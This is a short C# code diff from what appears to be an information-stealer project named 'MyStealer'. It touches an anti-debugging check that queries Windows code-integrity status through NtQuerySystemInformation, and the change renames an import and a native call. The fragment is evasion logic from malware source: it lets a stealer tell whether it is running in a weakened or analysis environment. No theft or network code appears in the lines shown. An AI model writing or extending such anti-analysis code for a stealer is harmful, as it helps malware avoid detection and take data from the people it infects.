@@ -1,5 +1,5 @@
-﻿using static MyStealer.AntiDebug.Win32Calls;
-using System.Runtime.InteropServices;
+﻿using System.Runtime.InteropServices;
+using static MyStealer.AntiDebug.NativeCalls;
 
 namespace MyStealer.AntiDebug.Check
 {
@@ -18,7 +18,7 @@ namespace MyStealer.AntiDebug.Check
                 Length = (uint)Marshal.SizeOf(typeof(SYSTEM_CODEINTEGRITY_INFORMATION))
             };
 
-            NtQuerySystemInformation(SystemCodeIntegrityInformation, ref CodeIntegrityInfo, (uint)Marshal.SizeOf(CodeIntegrityInfo), out var returnLength);
+            NtQuerySystemInformation_CodeIntegrityInfo(SystemCodeIntegrityInformation, ref CodeIntegrityInfo, (uint)Marshal.SizeOf(CodeIntegrityInfo), out var returnLength);
 
             return returnLength != (uint)Marshal.SizeOf(CodeIntegrityInfo)
                 || (CodeIntegrityInfo.CodeIntegrityOptions & CODEINTEGRITY_OPTION_ENABLED) == 0
